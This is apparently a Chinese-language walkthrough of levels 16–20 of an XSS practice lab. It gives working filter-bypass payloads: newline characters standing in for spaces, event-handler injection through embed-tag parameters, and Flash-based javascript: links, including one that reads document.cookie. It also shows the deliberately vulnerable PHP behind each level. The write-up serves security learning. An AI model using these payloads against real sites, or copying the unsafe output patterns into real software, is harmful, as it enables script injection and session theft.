## level 16：用回车符CR(%0d) 和换行符LF(%0a)取代空格绕过

过程
------

经过测试，发现对`script`、`/`、`空格`进行了转换，需要进行绕过：

这里用回车符CR(%0d) 和换行符LF(%0a)取代空格（在HTML中%0a和%0d是可以当成空格使用的）

payload：`?keyword=<img%0asrc=1%0donerror=alert(1)>`

或者`<img%0asrc=1%0donmouseover=alert(1)>`

我们用`<img%0asrc=1%0donmouseover=alert(1)>`，这样可以查看原始的页面源代码：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/052-image.jpg -->

页面会有个发生了错误的图片，把鼠标移到上面，便成功

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/053-image.jpg -->

后台源代码分析
-----------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/054-image.jpg -->

先将get方式提交的keyword参数通过`strtolower`函数转换为小写，然后采用`strtolower`函数过滤掉其中的`script`、`空格`、`/`

## level 17：swf文件导致的`flash xss`漏洞误会

过程
------

右键查看原始的页面源代码，发现了swf文件，这里一开始以为是存在`flash xss`漏洞，需要利用它来完成。但是一直没有利用成功，结果查了一下，并不需要这样完成

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/055-image.jpg -->

因为这里`arg01`和`arg02`提交的参数就存在了注入点：`?arg01=q&arg02=a`。经过尝试还把尖括号和双引号给html实体编码了

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/056-image.jpg -->

那么构造payload：`?arg01=a&arg02= onmouseover=alert(1)`

或者`?arg01= onmouseover=alert(1)&arg02=b`

然后把鼠标移到swf文件上面，便成功了。

右键查看下原始的页面源代码：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/057-image.jpg -->

payload中要注意`onmouseover`事件前面必须要空格，不然会变成这样。下面的后台源代码分析会讲到原理

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/058-image.jpg -->

后台源代码分析
-----------

```text-plain
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf01.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
<h2 align=center>成功后，<a href=level 18.php?arg01=a&arg02=b>点我进入下一关</a></h2>
```

这里用到了`<embed>`标签，是用来嵌入图片的。将get提交的arg01和arg02参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体。

因为这里arg01和arg02这两个参数是互相拼接起来的，所以比如在输入arg01参数时在其后面加一个空格，当浏览器解析到它的时候就会停止判断，然后将`onmouseover`事件看作另外一个属性；arg02参数同理。

## level 18：同level 17

过程
------

只能说是和level 17一模一样了，除了图片不同。直接用level 17的payload直接通关。

后台源代码分析
-----------

```text-plain
<?php
ini_set("display_errors", 0);
echo "<embed src=xsf02.swf?".htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"])." width=100% heigth=100%>";
?>
```

emmm，这里除了swf的文件名改成了xsf02.swf，其它都和level 17差不多。

## level 19：flash xss(反编译)

过程
------

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/059-image.jpg -->

右键查看原始的页面代码，发现访问`swf`文件的时候在传参

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/060-image.jpg -->

直接访问这个链接后，页面就是上面那样了：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/061-image.jpg -->

这里可以看到文件(即`flash`文件)里面提示了`sifr.js`是没有定义的。这不仅仅是个图片，需要对`swf`文件(即`flash`文件)进行反编译查看源码。这里使用的是`jpex`工具，它是针对flash的反编译工具。链接在这里：[GitHub - jindrapetrik/jpexs-decompiler: JPEXS Free Flash Decompiler](https://github.com/jindrapetrik/jpexs-decompiler)

具体反编译过程也可以参考这篇文章：[Flash XSS漏洞快速上手](https://blog.csdn.net/weixin_50464560/article/details/119211168)

这里也讲讲这里的过程：

我通过`sifr`找到了对应的脚本位置：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/062-image.jpg -->

在这个脚本中我找到了`flash`显示的信息，关键在`%s`这里：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/063-image.jpg -->

接着去定位`%s`：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/064-image.jpg -->

这里先把`VERSION_WARNING`以`%s`打散成数组，然后再以`version`的方式组合成字符串。可是搜索了一圈，并没有`version`，只通过`p-code`发现了这样的一个东西：

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/065-image.jpg -->

感觉这里是通过`url`来获取参数值的，于是构造了一个这样的参数`?arg01=version&arg02=123`。结果也不出所料，出现了`123`:

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/066-image.jpg -->

经过了许多种的尝试过后了，测试出了只有`<a>`这种是可以的，那么就构造payload：`?arg01=version&arg02=<a href="javascript:alert(/xss/)">xss</a>`

然后页面出现了`xss`，点击就成功了。

<!-- img: /assets/images/posts/网安/漏洞专题/xss各种姿势的学习/067-image.jpg -->

后台源代码分析
-----------

```text-plain
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf03.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
```

这里用到了`<embed>`标签，是用来嵌入图片的。将get提交的arg01和arg02参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体。

## level 20：同level 19

过程
------

这一关和level 19相似，这里直接给出payload。

payload：`?arg01=id&arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height`

后台源代码分析
-----------

```text-plain
<?php
ini_set("display_errors", 0);
echo '<embed src="xsf04.swf?'.htmlspecialchars($_GET["arg01"])."=".htmlspecialchars($_GET["arg02"]).'" width=100% heigth=100%>';
?>
```

这里用到了`<embed>`标签，是用来嵌入图片的。将get提交的arg01和arg02参数用`htmlspecialchars`函数把预定义的字符转换为 HTML 实体。



参考原文：[xss各种姿势的学习(包含绕过)和个人重要总结](https://www.freebuf.com/vuls/287655.html)
